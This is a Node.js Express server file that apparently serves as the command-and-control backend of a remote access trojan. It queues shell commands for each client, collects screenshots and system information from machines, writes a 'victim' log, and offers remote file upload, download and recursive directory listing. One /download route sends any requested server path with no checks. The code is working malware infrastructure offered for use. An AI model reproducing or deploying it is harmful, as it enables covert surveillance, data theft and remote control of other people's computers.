const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;

const systemInfoMap = new Map();

app.use(express.json({limit: '50mb'}));
app.use(express.urlencoded({limit: '50mb', extended: true}));
app.use(express.static('public'));

let commands = {};
let clientList = new Set();

global.screenshots = new Map();

const screenshotsDir = path.join(__dirname, 'screenshots');

if (!fs.existsSync(screenshotsDir)) {
    fs.mkdirSync(screenshotsDir);
}

const storage = multer.diskStorage({
    destination: function(req, file, cb) {
        const uploadPath = path.join(__dirname, 'uploads');
        if (!fs.existsSync(uploadPath)) {
            fs.mkdirSync(uploadPath);
        }
        cb(null, uploadPath);
    },
    filename: function(req, file, cb) {
        cb(null, Date.now() + '-' + file.originalname);
    }
});

const upload = multer({
    storage: storage,
    limits: {
        fileSize: 50 * 1024 * 1024 // 50MB
    },
    fileFilter: function(req, file, cb) {
        const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
        if (allowedTypes.includes(file.mimetype)) {
            cb(null, true);
        } else {
            cb(new Error('Invalid file type'));
        }
    }
});

app.get('/getScreenshot', (req, res) => {
    const username = req.query.username;
    const filePath = path.join(screenshotsDir, `${username}.png`);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.status(404).json({ error: 'Screenshot not found' });
    }
});

app.post('/screenshot', (req, res) => {
    const { username, image } = req.body;

    if (!username || !image) {
        console.error('Invalid request: Username or image missing');
        return res.status(400).json({ error: 'Invalid request. Username and image are required.' });
    }

    const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
    const filePath = path.join(screenshotsDir, `${username}.png`);

    try {
        // Debug log
        console.log(`Saving screenshot for ${username}`);
        console.log(`Base64 size: ${Buffer.byteLength(base64Data, 'base64')} bytes`);

        fs.writeFileSync(filePath, base64Data, 'base64');
        console.log(`Screenshot saved at: ${filePath}`);

        return res.json({ status: 'success', message: 'Screenshot received' });
    } catch (error) {
        console.error('Error saving screenshot:', error);
        return res.status(500).json({ status: 'error', message: 'Failed to save screenshot' });
    }
});

app.get('/screenshot/:username', (req, res) => {
    const { username } = req.params;
    const filePath = path.join(screenshotsDir, `${username}.png`);

    console.log(`Requesting screenshot for: ${username}`);
    if (!fs.existsSync(filePath)) {
        console.error(`Screenshot not found for username: ${username}`);
        return res.status(404).json({ status: 'error', message: 'Screenshot not found' });
    }

    try {
        const image = fs.readFileSync(filePath).toString('base64');
        const timestamp = new Date().toISOString();
        console.log(`Screenshot found for ${username}, sending...`);

        return res.json({
            status: 'success',
            data: { image, timestamp }
        });
    } catch (error) {
        console.error('Error reading screenshot:', error);
        return res.status(500).json({ status: 'error', message: 'Failed to retrieve screenshot' });
    }
});

app.get('/getcommand', (req, res) => {
    res.setHeader('Content-Type', 'application/json');
    const username = req.query.username;
    if (!username) {
        return res.status(400).json({ error: 'Username required' });
    }

    clientList.add(username);

    if (!commands[username]) {
        return res.json({
            command: '',
            timestamp: new Date().toISOString()
        });
    }

    const response = {
        command: commands[username],
        timestamp: new Date().toISOString()
    };

    commands[username] = '';

    return res.json(response);
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.post('/download', (req, res) => {
    const { path } = req.body;
    if (!path) {
        return res.status(400).json({ error: 'Path required' });
    }
    
    res.download(path, (err) => {
        if (err) {
            res.status(500).json({ error: 'Download failed' });
        }
    });
});

app.post('/setcommand', (req, res) => {
    const { username, command } = req.body;
    if (!username || !command) {
        return res.status(400).json({ error: 'Username and command required' });
    }

    commands[username] = command;
    
    const timestamp = new Date().toISOString();
    fs.appendFileSync('logs/commands.log', `${timestamp} - Command for ${username}: ${command}\n`);
    
    res.json({ status: 'success', message: 'Command set' });
});

app.get('/api/clients', (req, res) => {
    res.json({ clients: Array.from(clientList) });
});

app.post('/log', (req, res) => {
    const { message } = req.body;
    fs.appendFileSync('logs/victim.log', `${message}\n`);
    res.json({ status: 'success' });
});

app.get('/api/logs/commands', (req, res) => {
    try {
        const logs = fs.readFileSync('logs/commands.log', 'utf8');
        res.json({ logs: logs.split('\n').filter(Boolean) });
    } catch (error) {
        res.json({ logs: [] });
    }
});

app.get('/api/logs/victim', (req, res) => {
    try {
        const logs = fs.readFileSync('logs/victim.log', 'utf8');
        res.json({ logs: logs.split('\n').filter(Boolean) });
    } catch (error) {
        res.json({ logs: [] });
    }
});

app.post('/api/logs/clear', (req, res) => {
    try {
        fs.writeFileSync('logs/commands.log', '');
        fs.writeFileSync('logs/victim.log', '');
        res.json({ status: 'success', message: 'Logs cleared successfully' });
    } catch (error) {
        res.status(500).json({ 
            status: 'error', 
            message: 'Failed to clear logs: ' + error.message 
        });
    }
});

app.use('/images', express.static('public/images'));

app.post('/register', (req, res) => {
    try {
        const systemInfo = req.body;
        const username = systemInfo.username;
        
        console.log('Registering system info for:', username);
        console.log('System info:', systemInfo);
        
        systemInfoMap.set(username, systemInfo);
        clientList.add(username);
        
        console.log('Current clients:', Array.from(clientList));
        // DEBUG: console.log('Current system info:', Array.from(systemInfoMap.entries()));
        
        res.json({ status: 'success', message: 'System info registered' });
    } catch (error) {
        console.error('Error in /register:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.get('/api/systeminfo/:username', (req, res) => {
    try {
        const { username } = req.params;
        console.log('Fetching system info for:', username);
        
        const systemInfo = systemInfoMap.get(username);
        console.log('Found system info:', systemInfo);
        
        if (systemInfo) {
            res.json({
                status: 'success',
                data: systemInfo
            });
        } else {
            console.log('No system info found for:', username);
            res.status(404).json({
                status: 'error',
                message: 'System information not found for this user'
            });
        }
    } catch (error) {
        console.error('Error in /api/systeminfo:', error);
        res.status(500).json({
            status: 'error',
            message: error.message
        });
    }
});

app.post('/upload', upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }

        const uploadedFile = req.file;
        const targetPath = req.body.path;

        if (targetPath.includes('..') || targetPath.includes('system32')) {
            return res.status(403).json({ error: 'Invalid path specified' });
        }

        const finalPath = path.join(targetPath, uploadedFile.filename);
        fs.renameSync(uploadedFile.path, finalPath);

        res.json({
            success: true,
            message: 'File uploaded successfully',
            path: finalPath
        });
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ 
            error: 'Upload failed', 
            details: error.message 
        });
    }
});

app.post('/download', (req, res) => {
    try {
        const filePath = req.body.path;

        if (filePath.includes('..') || filePath.includes('system32')) {
            return res.status(403).json({ error: 'Invalid path specified' });
        }

        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'File not found' });
        }

        res.download(filePath, path.basename(filePath), (err) => {
            if (err) {
                console.error('Download error:', err);
                if (!res.headersSent) {
                    res.status(500).json({ 
                        error: 'Download failed',
                        details: err.message 
                    });
                }
            }
        });
    } catch (error) {
        console.error('Download error:', error);
        res.status(500).json({ 
            error: 'Download failed', 
            details: error.message 
        });
    }
});

app.get('/api/files/list', async (req, res) => {
    try {
        const directoryPath = req.query.path;
        
        if (!directoryPath || directoryPath.includes('..')) {
            return res.status(400).json({ 
                success: false, 
                error: 'Invalid path' 
            });
        }

        const readDirectory = (path) => {
            const items = fs.readdirSync(path);
            return items.map(item => {
                const fullPath = `${path}/${item}`;
                const stats = fs.statSync(fullPath);
                
                if (stats.isDirectory()) {
                    return {
                        type: 'directory',
                        name: item,
                        children: readDirectory(fullPath)
                    };
                }
                
                return {
                    type: 'file',
                    name: item,
                    size: stats.size
                };
            });
        };

        const files = readDirectory(directoryPath);
        res.json({ 
            success: true, 
            files 
        });

    } catch (error) {
        console.error('Error listing files:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

if (!fs.existsSync('logs')) {
    fs.mkdirSync('logs');
}

if (!fs.existsSync('logs/commands.log')) {
    fs.writeFileSync('logs/commands.log', '');
}
if (!fs.existsSync('logs/victim.log')) {
    fs.writeFileSync('logs/victim.log', '');
}

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});